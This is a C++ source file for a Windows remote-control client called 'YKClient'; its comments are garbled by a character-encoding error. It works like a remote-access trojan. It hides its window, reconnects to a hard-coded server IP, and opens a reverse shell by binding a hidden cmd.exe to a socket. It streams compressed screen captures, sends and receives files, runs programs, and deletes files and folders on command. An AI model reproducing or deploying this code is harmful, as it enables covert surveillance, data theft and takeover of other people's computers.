// ��������.cpp : Defines the entry point for the application.
//


#include "stdafx.h"
#include "shellapi.h"
#include "windows.h"
#include "stdio.h"
#include "stdlib.h"
#include "malloc.h"
#include "resource.h"
#include "Winsock2.h"
#include "NetMsg.h"
#include "My minilzo.h"
//#include "minilzo.h"

#define WM_CLIENTOK	WM_USER+1
#define WM_NETMSG	WM_USER+2

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"shell32.lib")
//������Ϣ���������
typedef struct net_msg
{
	DWORD dwCommand;//��������
	WPARAM wParam;//w����
	LPARAM lParam;//l����
	DWORD extra[20];//����Ĳ���
}NETMSG,*PNETMSG;
//�ļ����ݴ�����Ϣ
typedef struct net_filemsg
{
	DWORD dwCommand;//��������
	DWORD Index;//�ļ�����������
}FTMSG,*PFTMSG;
//�ļ�����
typedef struct filelist
{
	HANDLE hFile;
	int nCount;
	filelist *pNext;
}FLIST,*PFLIST;
//��Ļ���ӵľ��η�Χ
struct mon_rect
{
	DWORD  x;//x����
	DWORD  y;//y����
	DWORD  width;//���
	DWORD  height;//�߶�
}MonRect;
int NetPort[4]={4501,4502,4503,4504};//˳��Ϊcmd��file��img

HINSTANCE	hInst;
DWORD		pBitMap,scrX,scrY,BitsPixel,nSize,dwIP;
char 	pSend[1024],pRecv[1024],szIP[100]="192.168.199.208";// 111.13.12.29  119.133.157.200
HBITMAP hBit;
HDC	hCdc,hDdc,hdc,hdc1;
RECT rect ;
HANDLE hImgThread,hChatThread,hFileThread,hFileThreadS;
SOCKET SockChat,SockImg,SockFile,SockFileS;
HWND hWinMain;
HBITMAP hBitMap;
BITMAPINFO bmi;
int fSize,fSizeS;

DWORD WINAPI ThreadEnumFileAndSend(LPVOID pszPath)
{
	WIN32_FIND_DATA wfd;
	HANDLE hFile;
	int b=1;
	PNETMSG nMsg=(PNETMSG)pSend;
	lstrcat((char *)pszPath,"*.*");

	ZeroMemory(&wfd,sizeof(wfd));
	hFile=FindFirstFile((char *)pszPath,&wfd);
	while(b)
	{
		//�����ļ����Ե����ͻ�����
		CopyMemory(pSend+4,&wfd,sizeof(wfd));
		if((lstrcmp(wfd.cFileName,".")==0)||
			(lstrcmp(wfd.cFileName,"..")==0));//���ļ���Ϊ"."��".."��ʲôҲ����
		else
		{
			nMsg->dwCommand=NETMSG_FILELIST;
			send(SockChat,pSend,sizeof(wfd),0);
		}
		
		Sleep(150);
		ZeroMemory(&wfd,sizeof(wfd));
		b=FindNextFile(hFile,&wfd);
	}
	return 0;
}

BOOL AddTextToEdit(HWND hEdit,char *szTxt,BOOL bNextLine)
{
	static char NextLine[]={13,10,0};

	SendMessage(hEdit,EM_SETSEL,-2,-1);
	SendMessage(hEdit,EM_REPLACESEL,0,(long)szTxt);
	if(bNextLine)
		SendMessage(hEdit,EM_REPLACESEL,0,(long)NextLine);
	return 1;
}

int CmdShell(char *command,char *pOutBuf)
{
	char szBuf[5*1024];
	char str[256];
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	HANDLE hRead,hWrite;
	DWORD dwRead,Count=0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	//���������ܵ�����cmd�����
	CreatePipe(&hRead,&hWrite,&sa,0);

	//���ϵͳĿ¼
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe /c ");
	lstrcat(szBuf,command);

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);

	//��һ��һ��Ҫ���ڶ��ܵ�֮ǰ�������ڶ���֮ǰreadfile���᷵��
	//TMD���bug�˷�����һ�����ʱ��|||
	CloseHandle(hWrite);
	//ѭ�����ӹܵ���ķ�����Ϣ
	szBuf[0]=0;
	szBuf[1]=0;
	if (!pOutBuf)//pOutBufΪNULLָ��������д����
		return 0;
	while(1)
	{
		//ReadFile(hRead,rBuffer,1024,&dwRead,NULL)
		ReadFile(hRead,str,255,&dwRead,NULL);
		if(dwRead)
		{
			Count+=dwRead;
			str[dwRead]=0;
			str[dwRead+1]=0;				//�ܵ�����ַ��������0���Լ�����
			lstrcat(szBuf,str);
			continue;
		}
		else
			break;
	}
	lstrcpy(pOutBuf,szBuf);
	pOutBuf[Count+1]=0;
	pOutBuf[Count+2]=0;
	CloseHandle(hRead);

	return lstrlen(szBuf);
}
//��ܵ����������ֱ�Ӻ�Socket����
SOCKET CmdShellS(char *szIPAdrees,int Port,HANDLE *hProcess)
{
	char szBuf[5*1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,2),&wsaData))
		MessageBox(NULL,"��ʼ��ʧ��","Message",MB_OK);
	SOCKET sClient = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);
	if(sClient == INVALID_SOCKET)
	{
		MessageBox(NULL,"�׽��ֽ���ʧ��","Message",MB_OK);
	}
	// ��sockaddr_in�ṹ��װ��������˵�ַ��Ϣ
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(Port);
	servAddr.sin_addr.S_un.S_addr =dwIP;//��������ip
	//���ӷ�������
	connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr));

	//���ϵͳĿ¼
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe");

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError=(void *)sClient;
	si.hStdInput=(void *)sClient;
	si.hStdOutput =(void *)sClient;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
	(*hProcess)=pi.hProcess;

	return sClient;
}

HANDLE MyCreateFile(char *szFile,DWORD dwCreationDisposition)
{
	return CreateFile(szFile,GENERIC_ALL,FILE_SHARE_READ,NULL,
		dwCreationDisposition,FILE_ATTRIBUTE_NORMAL,NULL);
}

DWORD WINAPI FileThread(LPVOID lpParameter)
{
	PFLIST pHeader=NULL,p1,p2;
	char buf[102400];
	char *pBuf;
	HANDLE hFile=(HANDLE)lpParameter;
	PNETMSG nMsg=(PNETMSG)pSend;
	DWORD dwRead;
	int i;

	SockFile=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(NetPort[1]);
	servAddr.sin_addr.S_un.S_addr =dwIP;//��������ip
	//���ӷ�������
	connect(SockFile,(sockaddr*)&servAddr,sizeof(servAddr));
	while(1)
	{
		ReadFile(hFile,buf,102400,&dwRead,0);
		if(dwRead!=0)
		{
			send(SockFile,buf,dwRead,0);
		}
		else
		{
			CloseHandle(hFile);
			PostMessage(hWinMain,FT_FILEEND,0,0);
			closesocket(SockFile);
			return 0;
		}
		Sleep(50);
	}
	return 0; 
}

DWORD WINAPI FileThreadS(HANDLE hFile)
{
	PFLIST pHeader=NULL,p1,p2;
	char buf[102400];
	char *pBuf;
	HANDLE hFileS=(HANDLE)hFile;
	PNETMSG nMsg=(PNETMSG)pSend;
	DWORD dwWrite;
	int ret;

	SockFileS=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(NetPort[3]);
	servAddr.sin_addr.S_un.S_addr =dwIP;//��������ip
	//���ӷ�������
	connect(SockFileS,(sockaddr*)&servAddr,sizeof(servAddr));
	while(1)
	{
		ret=recv(SockFileS,buf,102400,0);
		if(ret>0)
		{
			WriteFile(hFile,buf,ret,&dwWrite,0);
		}
		else
		{
			CloseHandle(hFile);
			closesocket(SockFileS);
			return 0;
		}
	}
	return 0; 
}

DWORD WINAPI ImageThread(LPVOID lpParameter)
{
	char	str[256];
	unsigned char *pSendData;
	DWORD  dwYHSize;
	unsigned long size=0;

	SockImg = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	// ��sockaddr_in�ṹ��װ��������˵�ַ��Ϣ
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(NetPort[2]);
	servAddr.sin_addr.S_un.S_addr =dwIP;//��������ip
	//���ӷ�������
	connect(SockImg,(sockaddr*)&servAddr,sizeof(servAddr));
	hdc=GetWindowDC(NULL);
	pSendData=(unsigned char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,3*1024*1024);
	nSize=scrX*scrY*BitsPixel/8;
	lzo_init();//��ʼ��minilzoѹ����
	while(1)
	{
		BitBlt(hDdc,0,0,scrX,scrY,hdc,0,0,SRCCOPY);
		//send(SockImg,(const char *)pBitMap,nSize,0);
		Compress((const unsigned char *)pBitMap,nSize,pSendData,&size,wrkmem);
		if(send(SockImg,(const char *)pSendData,size,0)==0)
			return 0;//����˵���
		ZeroMemory(pSendData,size);
	}
	return 0;
}

void SaveScreenBmp(HANDLE hFile)							//����λͼ����
{
	unsigned long size=scrX*scrY*(BitsPixel/8);
	BITMAPFILEHEADER bmFileHeader = {0};
	BITMAPINFOHEADER bmInfoHeader = {0};
	DWORD dwSize;
		 //λͼ��Ϣͷ
			bmInfoHeader.biSize = sizeof(BITMAPINFOHEADER);  
			bmInfoHeader.biWidth = scrX;  
			bmInfoHeader.biHeight =scrY;
			bmInfoHeader.biPlanes = 1;
			bmInfoHeader.biBitCount = BitsPixel;
  
			//Bimap file header in order to write bmp file  
		//�ļ���Ϣͷ
			bmFileHeader.bfType = 0x4d42;  //'bmp'
			bmFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);  
			bmFileHeader.bfSize = bmFileHeader.bfOffBits+size;
		//����
			BitBlt(hDdc,0,0,scrX,scrY,GetWindowDC(NULL),0,0,SRCCOPY);//��Ļλͼ���ݸ��Ƶ��ڴ�λͼ

		 WriteFile(hFile,&bmFileHeader,sizeof(BITMAPFILEHEADER),&dwSize,NULL);
		 WriteFile(hFile,&bmInfoHeader,sizeof(BITMAPINFOHEADER),&dwSize,NULL);
		 WriteFile(hFile,(const void *)pBitMap,size,&dwSize,NULL);
}

void NetMsgProc()
{
	PNETMSG nMsg=(PNETMSG)pRecv;
	DWORD ThreadId;
	char str[1024];
	static SOCKET s;
	static HANDLE hPrcs,hThreadEnum,hFile,hFileS;

	switch(nMsg->dwCommand)
	{
	 case NETMSG_CHAT:
		 ShowWindow(hWinMain,SW_RESTORE);
		 PostMessage(hWinMain,WM_CHATMSG,0,0);	 
		 break;
	 case IDM_SHTUDOWN:
		 //system("shutdown -s -t 0");
		 break;
	 case IDM_STARTMON:
		 //����һ���̣߳�����ͼ���乤��
		 hImgThread=CreateThread(NULL,NULL,ImageThread,hWinMain,NULL,&ThreadId);
		 break;
	 case IDM_ENDMON:
		 TerminateThread(hImgThread,0);
		 break;
	 case NETMSG_CMD:
		 s=CmdShellS(szIP,NetPort[0],&hPrcs);
		 break;
	 case NETMSG_CMDEND:
		 closesocket(s);
		 TerminateProcess(hPrcs,0);
		 break;
	 case NETMSG_SETMONRECT:
		 CopyMemory(&MonRect,pRecv+4,sizeof(MonRect));
		 break;
	 case NETMSG_GETFILELIST:
		 TerminateThread(hThreadEnum,0);
		 hThreadEnum=CreateThread(NULL,NULL,ThreadEnumFileAndSend,(LPVOID)(pRecv+4),NULL,&ThreadId);
		 break;
	 case IDM_EXECUTE:
		 ShellExecute(NULL,"open",pRecv+4,0,0,SW_NORMAL);
		 break;
	 case IDM_RENAMEFILE:
		 wsprintf(str,"ren %s %s",pRecv+4,pRecv+512);
		 CmdShell(str,NULL);
		 break;
	 case NETMSG_DELFILE:
		 wsprintf(str,"del %s",pRecv+4);
		 CmdShell(str,NULL);
	 case NETMSG_DELFLODER:
		 wsprintf(str,"rd /s /q %s",pRecv+4);
		 CmdShell(str,NULL);
		 break;
	 case IDM_NEWFLODER:
		 wsprintf(str,"md %s",pRecv+4);
		 CmdShell(str,NULL);
		 break;
	 case NETMSG_PORT:
		 CopyMemory(NetPort,pRecv+4,sizeof(NetPort));
		 break;
	 case IDM_DOWNFILE:
		 hFile=MyCreateFile((char *)(pRecv+4),OPEN_EXISTING);
		 nMsg=(PNETMSG)pSend;
		if(hFile==INVALID_HANDLE_VALUE)
		{
			nMsg->dwCommand=FT_LASTFAIL;
			send(SockChat,pSend,4,0);
			return;
		}
		else
		{
			nMsg->dwCommand=FT_SIZE;
			nMsg->wParam=GetFileSize(hFile,NULL);
			fSize=nMsg->wParam;
			send(SockChat,pSend,8,0);
		}
		hFileThread=CreateThread(NULL,NULL,FileThread,hFile,NULL,&ThreadId);
		 break;
	 case IDM_UPFILE:
		 hFileS=CreateFile((char *)(pRecv+4),GENERIC_WRITE,FILE_SHARE_READ,NULL,
			OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		 nMsg=(PNETMSG)pSend;
		if(hFile==INVALID_HANDLE_VALUE)
		{
			nMsg->dwCommand=FT_LASTFAIL;
			send(SockChat,pSend,4,0);
			return;
		}
		hFileThreadS=CreateThread(NULL,NULL,FileThreadS,hFileS,NULL,&ThreadId);
		 break;
	 case FT_FILEBREAK:
		 CloseHandle(hFile);
		 TerminateThread(hFileThread,0);
		 break;
	 case FT_SIZE:
		 fSizeS=nMsg->wParam;
		 break;
	 case IDM_CAPSCR:
		 hFile=MyCreateFile("c:\\CapScreen.bmp",OPEN_ALWAYS);
		 SaveScreenBmp(hFile);
		 CloseHandle(hFile);
		 lstrcpy(pRecv+4,"c:\\CapScreen.bmp");
		 nMsg->dwCommand=IDM_DOWNFILE;
		 NetMsgProc();
	}
	return;
}
//��������ʧȥ����ʱ
void OnLinkBreak()
{
	ShowWindow(hWinMain,SW_HIDE);
	TerminateThread(hImgThread,0);
}
//�����Ӹս���ʱ
void OnLinkInit()
{	 
	PNETMSG nMsg=(PNETMSG)pSend;
	//���ӳ�ʼ������
	struct 
	{
		DWORD scrX;//��Ļ���
		DWORD scrY;//��Ļ�߶�
		DWORD BitsPixel;//����λ����һ��Ϊ32)
		DWORD dwDrivers;//�����б���Ϣ
	}LinkInfo;
	LinkInfo.scrX=scrX;
	LinkInfo.scrY=scrY;
	LinkInfo.BitsPixel=BitsPixel;
	LinkInfo.dwDrivers=GetLogicalDrives();
	nMsg->dwCommand=NETMSG_INITINFO;
	CopyMemory(pSend+4,&LinkInfo,sizeof(LinkInfo));
	send(SockChat,pSend,sizeof(LinkInfo)+4,0);
}

DWORD WINAPI ChatThread(LPVOID lpParameter)
{
    DWORD ThreadId;
    int ret;

    a:	SockChat = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(SockChat == INVALID_SOCKET) return 0;

    sockaddr_in ChatSin;
    ChatSin.sin_family = AF_INET;
    ChatSin.sin_port = htons(4500);
    ChatSin.sin_addr.S_un.S_addr =dwIP;
    Sleep(100);
    ShowWindow(hWinMain,SW_HIDE);
    //���ӷ�������
    while(connect(SockChat,(sockaddr*)&ChatSin,sizeof(ChatSin))==SOCKET_ERROR)
        Sleep(1000);
    Sleep(100);
    //MessageBox(NULL,"   ","    ",MB_OK);
    OnLinkInit();
    while(1)
    {
        ret=recv(SockChat,pRecv,1024,0);
        if(ret>0)
            PostMessage(hWinMain,WM_NETMSG,0,0);
        else// if(ret==0)
        {
            //��������ʧȥ����ʱ
            closesocket(SockChat);
            OnLinkBreak();
            goto a;
            
        }
        Sleep(100);
    }
    return 0;
}

void InitIP()
{
    hostent *p;//һ��ָ��hostent��ָ��

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2),&wsaData);

    dwIP=inet_addr(szIP);

    if(dwIP==INADDR_NONE)//�����ַת�����ɹ�����Ŀ���ַΪ������ʽ
    {
        p=gethostbyname(szIP);
        dwIP=(unsigned long)p->h_addr_list[0];
    }
}

int CALLBACK ProcDlg (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    DWORD dwCounts,dwSize,ThreadId;
    HANDLE hFile;HWND hEdit;
    BITMAPFILEHEADER bmFileHeader = {0}; 
    BITMAPINFOHEADER bmInfoHeader = {0}; 
    PNETMSG nMsg=(PNETMSG)pSend;
    char str[5120];
    int len;

    switch(message)
    {
    case WM_INITDIALOG:
        hWinMain=hwnd;
        SetWindowText(hwnd,"YKClient ");
        InitIP();
        //����һ���̣߳��������ָ��
        hChatThread=CreateThread(NULL,NULL,ChatThread,hwnd,NULL,&ThreadId);
        //ע���ȼ�
        RegisterHotKey(hwnd,0,MOD_ALT|MOD_CONTROL,0x50);

        //��д��Ļ��Ϣ
        scrX=GetSystemMetrics(SM_CXSCREEN);
        scrY=GetSystemMetrics(SM_CYSCREEN);
        BitsPixel=GetDeviceCaps(GetWindowDC(NULL),BITSPIXEL);

        hdc=GetDC(hWinMain);
        hCdc=CreateCompatibleDC(hdc);
        hDdc=CreateCompatibleDC(hdc);
        hBitMap=CreateCompatibleBitmap(hCdc,scrX,scrY);
        SelectObject(hCdc,hBitMap);
        //����Ӧ�ó������ֱ��д��ġ����豸�޹ص�λͼ��DIB��		
        ZeroMemory(&bmi,sizeof(BITMAPINFO));
        bmi.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount =BitsPixel;
        bmi.bmiHeader.biHeight=scrY;
        bmi.bmiHeader.biWidth =scrX;
        bmi.bmiHeader.biPlanes=1;
        hBit=CreateDIBSection(hDdc,&bmi,DIB_RGB_COLORS,(void **)(&pBitMap),NULL,0);
        SelectObject(hDdc,hBit);
        ReleaseDC(hWinMain,hdc);
        break;
    case WM_NETMSG:
        NetMsgProc();
    case WM_COMMAND:
        switch(LOWORD(wParam))
        {
        case IDOK:
            hEdit=GetDlgItem(hwnd,IDC_SHOW);
            len=GetDlgItemText(hwnd,IDC_EDIT,(char *)(pSend+4),1024);
            AddTextToEdit(hEdit,"Client:",1);
            AddTextToEdit(hEdit,(pSend+4),1);
            nMsg->dwCommand=NETMSG_CHAT;
            send(SockChat,pSend,len*2+5,0);
            SetDlgItemText(hwnd,IDC_EDIT,NULL);
            break;
        case IDCANCEL:
            EndDialog(hwnd,0);
            break;
        }
    break;
    case WM_CHATMSG:
        hEdit=GetDlgItem(hwnd,IDC_SHOW);
        AddTextToEdit(hEdit,"Server:",1);
        AddTextToEdit(hEdit,(pRecv+4),1);
        break;
    case WM_CLOSE:
        ShowWindow(hwnd,SW_HIDE);
        break;
    case WM_HOTKEY:
        //RGBtoJPEGFile((unsigned char *)pBitMap,scrY,scrX,"c:\\jpg.jpg");
        ShowWindow(hwnd,SW_NORMAL);
        //��ͼ����(��ؿ�ʼ�����Ч)
        hFile=CreateFile("c:\\bmp.bmp",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        //λͼ��Ϣͷ
        bmInfoHeader.biSize = sizeof(BITMAPINFOHEADER);  
        bmInfoHeader.biWidth = bmi.bmiHeader.biWidth;  
        bmInfoHeader.biHeight = bmi.bmiHeader.biHeight ;  
        bmInfoHeader.biPlanes = 1;  
        bmInfoHeader.biBitCount = 32;

        //Bimap file header in order to write bmp file  
        //�ļ���Ϣͷ
        bmFileHeader.bfType = 0x4d42;  //bmp    
        bmFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);  
        bmFileHeader.bfSize = bmFileHeader.bfOffBits + nSize;
        WriteFile(hFile,&bmFileHeader,sizeof(BITMAPFILEHEADER),&dwSize,NULL);
        WriteFile(hFile,&bmInfoHeader,sizeof(BITMAPINFOHEADER),&dwSize,NULL);
        WriteFile(hFile,(const void *)pBitMap,nSize,&dwSize,NULL);
        break;
    case FT_FILEEND:
        DeleteFile("c:\\CapScreen.bmp");
        break;
    default:
        return 0;
    }
    return 1;
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int iCmdShow)
{
	 if(FindWindow(NULL,"YKClient "))
		 return 0;
     DialogBoxParam(hInst,(const char *)IDD_DIALOG1,NULL,ProcDlg,0);
	 return 0;
}


